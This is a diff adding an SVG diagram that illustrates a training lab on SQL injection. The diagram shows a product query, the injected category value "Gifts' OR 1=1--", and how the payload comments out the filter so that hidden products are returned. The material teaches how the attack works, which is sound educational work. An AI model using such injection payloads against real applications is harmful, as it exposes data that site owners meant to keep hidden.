@@ -1,0 +1,42 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 820 440" font-family="ui-monospace, SFMono-Regular, Menlo, monospace">
+  <defs>
+    <linearGradient id="bg" x1="0" y1="0" x2="1" y2="1">
+      <stop offset="0" stop-color="#0d1117"/>
+      <stop offset="1" stop-color="#161b22"/>
+    </linearGradient>
+  </defs>
+  <rect width="820" height="440" rx="14" fill="url(#bg)"/>
+  <rect x="0" y="0" width="820" height="52" rx="14" fill="#1f6feb"/>
+  <rect x="0" y="38" width="820" height="14" fill="#1f6feb"/>
+  <circle cx="26" cy="26" r="6" fill="#ff5f56"/>
+  <circle cx="46" cy="26" r="6" fill="#ffbd2e"/>
+  <circle cx="66" cy="26" r="6" fill="#27c93f"/>
+  <text x="410" y="31" fill="#ffffff" font-size="17" font-weight="700" text-anchor="middle">SQL Injection · retrieve hidden data</text>
+
+  <!-- Vulnerable query -->
+  <text x="34" y="92" fill="#8b949e" font-size="13">Normal request &#8594; server builds:</text>
+  <rect x="30" y="104" width="760" height="40" rx="8" fill="#010409" stroke="#30363d"/>
+  <text x="46" y="130" font-size="14.5">
+    <tspan fill="#79c0ff">SELECT</tspan><tspan fill="#c9d1d9"> * </tspan><tspan fill="#79c0ff">FROM</tspan><tspan fill="#c9d1d9"> products </tspan><tspan fill="#79c0ff">WHERE</tspan><tspan fill="#c9d1d9"> category = </tspan><tspan fill="#a5d6ff">'Gifts'</tspan><tspan fill="#c9d1d9"> </tspan><tspan fill="#79c0ff">AND</tspan><tspan fill="#c9d1d9"> released = </tspan><tspan fill="#ffa657">1</tspan>
+  </text>
+  <text x="618" y="130" font-size="12" fill="#f85149">&#8592; hides unreleased</text>
+
+  <!-- Payload -->
+  <text x="34" y="182" fill="#8b949e" font-size="13">Inject into the category parameter:</text>
+  <rect x="30" y="194" width="760" height="40" rx="8" fill="#010409" stroke="#f0883e"/>
+  <text x="46" y="220" font-size="16" fill="#ffa657" font-weight="700">?category=Gifts' OR 1=1--</text>
+
+  <!-- Injected query -->
+  <text x="34" y="272" fill="#8b949e" font-size="13">Query becomes:</text>
+  <rect x="30" y="284" width="760" height="40" rx="8" fill="#010409" stroke="#30363d"/>
+  <text x="46" y="310" font-size="14.5">
+    <tspan fill="#79c0ff">SELECT</tspan><tspan fill="#c9d1d9"> * </tspan><tspan fill="#79c0ff">FROM</tspan><tspan fill="#c9d1d9"> products </tspan><tspan fill="#79c0ff">WHERE</tspan><tspan fill="#c9d1d9"> category = </tspan><tspan fill="#a5d6ff">'Gifts'</tspan><tspan fill="#c9d1d9"> </tspan><tspan fill="#79c0ff">OR</tspan><tspan fill="#3fb950" font-weight="700"> 1=1</tspan><tspan fill="#6e7681"> --  AND released = 1</tspan>
+  </text>
+  <text x="612" y="310" font-size="12" fill="#6e7681">&#8592; commented out</text>
+
+  <!-- Result -->
+  <rect x="30" y="352" width="760" height="58" rx="10" fill="#0f2417" stroke="#238636"/>
+  <text x="52" y="380" font-size="15" fill="#3fb950" font-weight="700">1=1 is always true &#8594; WHERE matches every row</text>
+  <text x="52" y="399" font-size="12.5" fill="#8b949e">The database returns all products — released and hidden. Lab solved.</text>
+  <text x="704" y="388" font-size="13" fill="#3fb950" font-weight="700" text-anchor="middle">SOLVED &#10003;</text>
+</svg>
